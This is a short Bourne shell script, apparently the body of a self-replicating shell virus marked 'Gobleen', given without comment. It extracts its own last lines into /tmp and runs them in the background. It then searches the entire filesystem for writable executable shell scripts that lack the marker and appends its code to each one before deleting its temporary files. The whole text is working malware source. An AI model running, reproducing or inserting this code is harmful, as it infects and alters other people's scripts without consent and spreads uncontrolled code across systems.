tail -n 9 $0 > /tmp/vicGWI; grep -v runGWI /tmp/vicGWI > /tmp/runGWI
chmod 755 /tmp/runGWI; (/tmp/runGWI &); exit 0
find / -type f -perm +111 -exec bash -c \
"if [ ! -d {} ] && [ -z \"\`grep -s Gobleen {}\`\" -a -x {} -a -w {} ] ; then
    if [ -n \"\`file {} | grep Bourne\`\" ] ; then
        echo >> {}
        cat /tmp/vicGWI >> {}
fi; fi" \;
rm /tmp/???GWI
